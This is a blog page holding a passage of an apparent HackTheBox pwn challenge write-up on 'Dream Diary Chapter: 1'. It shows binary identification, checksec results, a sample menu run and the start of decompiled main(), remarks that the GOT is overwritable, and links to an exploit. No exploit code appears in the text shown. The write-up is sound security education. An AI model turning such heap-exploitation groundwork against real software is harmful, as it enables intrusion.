






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>HTB Pwn - Dream Diary Chapter: 1 &middot; PwnFuzz</title>
    <meta name="title" content="HTB Pwn - Dream Diary Chapter: 1 &middot; PwnFuzz" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.0d4e84cf1b74a516536192ed47e7d6c83164ab7d9050f2fe775c5d6832ceddfc.css"
    integrity="sha256-DU6Ezxt0pRZTYZLtR&#43;fWyDFkq32QUPL&#43;d1xdaDLO3fw="
  />
  
    
    
    
  
  
  
    
    
  
  
    
    
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.0ce71464304b0e7f6f5dc04656b9ff39cbcb7ff30af0a0e1268c1c3147e8ddd8.js"
      integrity="sha256-DOcUZDBLDn9vXcBGVrn/OcvLf/MK8KDhJowcMUfo3dg="
      data-copy="Copy"
      data-copied="Copied"
    ></script>
  
  
  <meta
    name="description"
    content="
      
        This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn&rsquo;t get time for this writeup, so I will write it here.
      
    "
  />
  <meta name="google-site-verification" content="K7KosUi5pj-pvy_N51qyPAbh8V777BqtvVdbUcqNslU" />
  
  
  
  <link rel="canonical" href="http://localhost:1313/posts/dream-diary-chapter-1/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/dream-diary-chapter-1/">
  <meta property="og:site_name" content="PwnFuzz">
  <meta property="og:title" content="HTB Pwn - Dream Diary Chapter: 1">
  <meta property="og:description" content="This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn’t get time for this writeup, so I will write it here.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-10-19T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-10-19T00:00:00+00:00">
    <meta property="article:tag" content="Unlink, Htb, Pwn, Heap">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HTB Pwn - Dream Diary Chapter: 1">
<meta name="twitter:description" content="This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn&rsquo;t get time for this writeup, so I will write it here.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "HTB Pwn - Dream Diary Chapter: 1",
    "headline": "HTB Pwn - Dream Diary Chapter: 1",
    
    "abstract": "This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn\u0026rsquo;t get time for this writeup, so I will write it here.",
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/dream-diary-chapter-1\/",
    "author" : {
      "@type": "Person",
      "name": "Robin (D4mianWayne)"
    },
    "copyrightYear": "2020",
    "dateCreated": "2020-10-19T00:00:00\u002b00:00",
    "datePublished": "2020-10-19T00:00:00\u002b00:00",
    
    "dateModified": "2020-10-19T00:00:00\u002b00:00",
    
    "keywords": ["unlink, htb, pwn, heap"],
    
    "mainEntityOfPage": "true",
    "wordCount": "4566"
  }
  </script>


  
  <meta name="author" content="Robin (D4mianWayne)" />
  
    
      <link href="https://twitter.com/D4mianWayne" rel="me" />
    
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="z-40 flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >PwnFuzz</a
  >

    </div>
    
      
      <label id="menu-button" for="menu-controller" class="block sm:hidden">
        <input type="checkbox" id="menu-controller" class="hidden" />
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
        >
          <ul
            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
          >
            <li class="mb-1">
              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span></span
              >
            </li>
            
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/posts/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Blog</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/categories/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Categories</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/about/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >About</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/tags/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Tags</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="https://github.com/D4mianWayne"
                      title=""
                      onclick="close_menu()"
                      target="_blank"
                      >
                        <span
                          class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                        ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    
                    
                      <button
                        id="search-button-1"
                        title="Search (/)"
                      >
                        
                          <span
                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                            ></span
                          >
                        
                      </button>
                    
                  
                </li>
              
                
                  
              
            
          </ul>
        </div>
      </label>
      
      <ul class="hidden list-none flex-row text-end sm:flex">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/posts/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/about/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >About</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="https://github.com/D4mianWayne"
                  title=""
                  target="_blank"
                  >
                    <span
                      class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                
                
                  <button
                    id="search-button-2"
                    title="Search (/)"
                  >
                    
                      <span
                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                        ></span
                      >
                    
                  </button>
                
              
            </li>
          
            
              
          

        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article class="max-w-full">
    <header>
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/"
      >PwnFuzz</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class=" inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/dream-diary-chapter-1/"
      >HTB Pwn - Dream Diary Chapter: 1</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        HTB Pwn - Dream Diary Chapter: 1
      </h1>
    </header>
    <section class="prose mt-6 max-w-full dark:prose-invert">
      <p>This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn&rsquo;t get time for this writeup, so I will write it here.</p>
<!-- more -->
<h1 id="attachment" class="relative group">Attachment <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#attachment" aria-label="Anchor">#</a></span></h1><p>Binary: <a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1" target="_blank" rel="noreferrer">Get Here</a>
Exploit: <a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1.py" target="_blank" rel="noreferrer">Get Here</a></p>
<h1 id="initial-analysis" class="relative group">Initial Analysis <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-analysis" aria-label="Anchor">#</a></span></h1><p>First of, all we will see the binary and the security mechanisms on the binary and see the workflow of it. Let&rsquo;s identify the file:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[05:10:38]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">file</span> <span class="no">chapter1</span>
</span></span><span class="line"><span class="cl"><span class="nl">chapter1:</span> <span class="nf">ELF</span> <span class="mi">64</span><span class="p">-</span><span class="no">bit</span> <span class="no">LSB</span> <span class="no">executable</span><span class="p">,</span> <span class="no">x86-64</span><span class="p">,</span> <span class="no">version</span> <span class="mi">1</span> <span class="p">(</span><span class="no">SYSV</span><span class="p">),</span> <span class="no">dynamically</span> <span class="no">linked</span><span class="p">,</span> <span class="no">interpreter</span> <span class="err">/</span><span class="no">lib64</span><span class="err">/</span><span class="no">ld-linux-x86-64.so.2</span><span class="p">,</span> <span class="no">for</span> <span class="no">GNU</span><span class="err">/</span><span class="no">Linux</span> <span class="mi">2</span><span class="no">.6.32</span><span class="p">,</span> <span class="no">BuildID</span><span class="p">[</span><span class="no">sha1</span><span class="p">]</span><span class="err">=</span><span class="mi">5</span><span class="no">fd205b7bbec91799613399634a187d1ca71e1a3</span><span class="p">,</span> <span class="no">stripped</span>
</span></span></code></pre></div><p>So, this is a 64 bit binary and on top of that it is stripped, which means reverse engineering it&rsquo;ll take quite sometime, let&rsquo;s check the security mechanisms:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[05:10:41]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">checksec</span> <span class="no">chapter1</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span></code></pre></div><p><code>Canary</code> and <code>NX Enabled</code> means that overflow is not gonna happen easily considering <strong>iff</strong> any kind of overflow exists, and it has <code>Partial RELRO</code> which <code>Global Offset Table</code> would be in <code>r/w</code> section which means we can overwrite the GOT entries.</p>
<p>All things, aside let&rsquo;s run the binary:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">2</span> <span class="err">[05:12:09]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="p">.</span><span class="err">/</span><span class="no">chapter1</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">+</span><span class="p">------------------------------</span><span class="err">+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="err">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">Size:</span> <span class="err">100</span>
</span></span><span class="line"><span class="cl"><span class="nl">Data:</span> <span class="nf">AAA</span>
</span></span><span class="line"><span class="cl"><span class="nf">Success</span><span class="p">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="err">2</span>
</span></span><span class="line"><span class="cl"><span class="nl">Index:</span> <span class="err">0</span>
</span></span><span class="line"><span class="cl"><span class="nl">Data:</span> <span class="nf">AKSSKSK</span>
</span></span><span class="line"><span class="cl"><span class="nf">Done</span><span class="p">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="nf">Invalid</span> <span class="no">choice</span><span class="p">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="err">3</span>
</span></span><span class="line"><span class="cl"><span class="nl">Index:</span> <span class="err">0</span>
</span></span></code></pre></div><p>So, it seems like it allocates a specific amount of size in memory and then let us store the data at allocated region. On top of that it allow us to delete the allocated region and even edit an allocated chunk. Since we want to pwn it, we need to reverse engineer it, let&rsquo;s go.</p>
<h1 id="reverse-engineering" class="relative group">Reverse Engineering <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering" aria-label="Anchor">#</a></span></h1><p>First off, we will load the binary in IDA and let it do the work, then we will analyze the functions. First, we will check the <code>main</code> function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">real_canary</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">real_canary</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
